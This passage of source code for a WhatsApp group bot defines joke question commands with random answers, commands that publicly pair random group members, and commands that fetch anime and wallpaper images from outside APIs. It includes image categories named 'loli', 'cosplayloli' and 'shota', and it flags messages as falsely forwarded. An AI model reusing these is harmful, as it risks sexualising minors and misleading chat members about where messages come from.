          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'is': {
            	if (!text) return replygckev('Ask question\n\nExample : ${prefix + command} she virgin?')
            	let apa = ['Yes', 'No', 'It Could Be', 'Thats right']
                let kah = apa[Math.floor(Math.random() * apa.length)]
                let jawab = '*Is ${text}*\nAnswer : ${kah}'                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'when': {
            	if (!text) return replygckev('Ask question\n\nExample : ${prefix + command} will i get married?')
            	let kapan = ['5 More Days', '10 More Days', '15 More Days','20 More Days', '25 More Days','30 More Days','35 More Days','40 More Days','45 More Days','50 More Days','55 More Days','60 More Days','65 More Days','70 More Days','75 More Days','80 More Days','85 More Days','90 More Days','100 More Days','5 Months More', '10 Months More', '15 Months More','20 Months More', '25 Months More','30 Months More','35 Months More','40 Months More','45 Months More','50 Months More','55 Months More','60 Months More','65 Months More','70 Months More','75 Months More','80 Months More','85 Months More','90 Months More','100 Months More','1 More Year','2 More Years','3 More Years','4 More Years','5 More Years','Tomorrow','The Day After Tomorrow']
                let koh = kapan[Math.floor(Math.random() * kapan.length)]
                let jawab = '*${command} ${text}*\nAnswer : ${koh}'                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'what': {
            	if (!text) return replygckev('Ask question\n\nExample : ${prefix + command} is your name?')
            	let lel = ['Ask Your Gf', 'I Dont Know', 'I Don't Know, Ask Your Father']
                let kah = lel[Math.floor(Math.random() * lel.length)]
                let jawab = '*What ${text}*\nAnswer : ${kah}'                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'where': {
if (!text) return replygckev('Ask question\n\nExample : ${prefix + command} is your name?')
            	let wherelol = ['In the mountain', 'On mars', 'On moon','In the jungle','I dont know ask your mom','It could be somewhere']
                let kah = wherelol[Math.floor(Math.random() * wherelol.length)]
                let jawab = '*Whwre ${text}*\nAnswer : ${kah}'              
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'how': {
            	if (!text) return replygckev('Ask question\n\nExample : ${prefix + command} to date girl?')
            	let gimana = ['Ummm...', 'It's Difficult Bro', 'Sorry Bot Can't Answer', 'Try Searching On Google','Holy Cow! Really???','Dizzy Ah😴, don't wanna answer','Ohhh I See:(','The Patient, Boss:(','Really dude 🙄']
                let kah = gimana[Math.floor(Math.random() * gimana.length)]
                let jawab = '*How ${text}*\nAnswer : ${kah}'                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
case 'rate': {
            	if (!text) return replygckev('Example : ${prefix + command} my profile')
            	let ra = ['1','2','3','4','5','6','7','8','9','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31','32','33','34','35','36','37','38','39','40','41','42','43','44','45','46','47','48','49','50','51','52','53','54','55','56','57','58','59','60','61','62','63','64','65','66','67','68','69','70','71','72','73','74','75','76','77','78','79','80','81','82','83','84','85','86','87','88','89','90','91','92','93','94','95','96','97','98','99','100']
                let kah = ra[Math.floor(Math.random() * ra.length)]
                let jawab = '*Rate ${text}*\nAnswer : ${kah}%'                
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: jawab
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/sylvers.jpg') }, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"🧐\",\"id\":\"\"}'
            }],
          }),
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'runtime': {
            	let lowq = '*Sylvers Md est en ligne depuis :*\n*${runtime(process.uptime())}*'
                replygckev(lowq)
            	}
            break
            case 'amesoeur': {
            if (!m.isGroup) return KevStickGroup()
            let member = participants.map(u => u.id)
            let me = m.sender
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '👫Votre ame s�ur est

@${me.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/ame_s�ur.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"👀❤️\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [me, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})        
            }
            break
 case 'couple': {
            if (!m.isGroup) return KevStickGroup()
            let member = participants.map(u => u.id)
            let orang = member[Math.floor(Math.random() * member.length)]
            let jodoh = member[Math.floor(Math.random() * member.length)]
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '💏Incroyable\n\n@${orang.split('@')[0]}\n\n          ❤️\n\n@${jodoh.split('@')[0]}\n\nSont en couple ❤️💖👀'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./KenvFile/theme/couple.jpg')}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"👀❤️\",\"id\":\""}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [orang, jodoh], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'fond_ecran': {
                if (!text) return replygckev('Veuillez entrer un titre')
                await KevStickWait()
		let { wallpaper } = require('./bibliotheque/scraper')
                anuwallpep = await wallpaper(text)
                result = anuwallpep[Math.floor(Math.random() * anuwallpep.length)]       
         let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat de: ${text}*_\n\n${themeemoji} Titre : ${result.title}\n${themeemoji} Categorie : ${result.type}\n${themeemoji} Detail : ${result.source}\n${themeemoji} Media Url : ${result.image[2] || result.image[1] || result.image[0]}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image[0]}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'wikimedia': {
                if (!text) return replygckev('Veuillez entrer un titre')
                await KevStickWait()
		let { wikimedia } = require('./bibliotheque/scraper')
                let anumedia = await wikimedia(text)
                result = anumedia[Math.floor(Math.random() * anumedia.length)]
                let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat de ${text}*_\n\n${themeemoji} Titr wee : ${result.title}\n${themeemoji} Source : ${result.source}\n${themeemoji} Media Url : ${result.image}'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: {url: result.image}}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command} ${text}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
                
            }
            break
            case 'loli': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
 
            }
            break
            case 'waifu': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            break
            case 'neko': {
            let baseUrl = 'https://weeb-api.vercel.app/'
      const response = await fetch(baseUrl + command)
      const imageBuffer = await response.buffer() // Get the image data as a buffer
      let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hey ${pushname}\n_*Voici le resultat de ${command}*_'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: imageBuffer}, { upload: Kev.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": '{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}'
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await Kev.relayMessage(m.chat, msgs.message, {})
            }
            case 'wallhp': case 'akira': case 'akiyama': case 'ana': case 'art': case 'asuna': case 'ayuzawa': case 'boruto': case 'bts': case 'chiho': case 'chitoge': case 'cosplay': case 'cosplayloli': case 'cosplaysagiri': case 'cyber': case 'deidara': case 'doraemon': case 'elaina': case 'emilia': case 'erza': case 'exo':  case 'gamewallpaper': case 'gremory': case 'hacker': case 'hestia': case 'husbu': case 'inori': case 'islamic': case 'isuzu': case 'itachi': case 'itori': case 'jennie': case 'jiso': case 'justina': case 'kaga': case 'kagura': case 'kakasih': case 'kaori': case 'cartoon': case 'shortquote': case 'keneki': case 'kotori': case 'kurumi': case 'lisa': case 'loli2': case 'madara': case 'megumin': case 'mikasa': case 'mikey': case 'miku': case 'minato': case 'mountain': case 'naruto': case 'nekonime': case 'nezuko': case 'onepiece': case 'pentol': case 'pokemon': case 'programming':  case 'randomnime': case 'randomnime2': case 'rize': case 'rose': case 'sagiri': case 'sakura': case 'sasuke': case 'satanic': case 'shina': case 'shinka': case 'shinomiya': case 'shizuka': case 'shota': case 'space': case 'technology': case 'tejina': case 'toukachan': case 'tsunade': case 'waifu2': case 'yotsuba': case 'yuki': case 'yulibocil': case 'yumeko':{
await KevStickWait()
let heyy
if (/akira/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akira.json')
if (/akiyama/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/akiyama.json')
if (/ana/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ana.json')
if (/art/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/art.json')
if (/asuna/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/asuna.json')
if (/ayuzawa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/ayuzawa.json')
if (/boneka/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boneka.json')
if (/boruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/boruto.json')
if (/bts/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/bts.json')
if (/cecan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cecan.json')
if (/chiho/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chiho.json')
if (/chitoge/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/chitoge.json')
if (/cogan/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cogan.json')
if (/cosplay/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplay.json')
if (/cosplayloli/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplayloli.json')
if (/cosplaysagiri/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cosplaysagiri.json')
if (/cyber/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/cyber.json')
if (/deidara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/deidara.json')
if (/doraemon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/doraemon.json')
if (/eba/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/eba.json')
if (/elaina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/elaina.json')
if (/emilia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/emilia.json')
if (/erza/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/erza.json')
if (/exo/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/exo.json')
if (/femdom/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/femdom.json')
if (/freefire/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/freefire.json')
if (/gamewallpaper/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gamewallpaper.json')
if (/glasses/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/glasses.json')
if (/gremory/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/gremory.json')
if (/hacker/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hekel.json')
if (/hestia/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/hestia.json')
if (/husbu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/husbu.json')
if (/inori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/inori.json')
if (/islamic/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/islamic.json')
if (/isuzu/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/isuzu.json')
if (/itachi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itachi.json')
if (/itori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/itori.json')
if (/jennie/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jeni.json')
if (/jiso/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/jiso.json')
if (/justina/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/justina.json')
if (/kaga/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaga.json')
if (/kagura/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kagura.json')
if (/kakasih/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kakasih.json')
if (/kaori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kaori.json')
if (/cartoon/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kartun.json')
if (/shortquote/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/katakata.json')
if (/keneki/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/keneki.json')
if (/kotori/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kotori.json')
if (/kpop/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kpop.json')
if (/kucing/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kucing.json')
if (/kurumi/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/kurumi.json')
if (/lisa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/lisa.json')
if (/loli2/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/loli.json')
if (/madara/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/madara.json')
if (/megumin/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/megumin.json')
if (/mikasa/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikasa.json')
if (/mikey/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mikey.json')
if (/miku/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/miku.json')
if (/minato/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/minato.json')
if (/mobile/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mobil.json')
if (/motor/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/motor.json')
if (/mountain/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/mountain.json')
if (/naruto/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/naruto.json')
if (/nekonime/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nekonime.json')
if (/nezuko/.test(command)) heyy = await fetchJson('https://raw.githubusercontent.com/DGXeon/XeonMedia/master/nezuko.json')
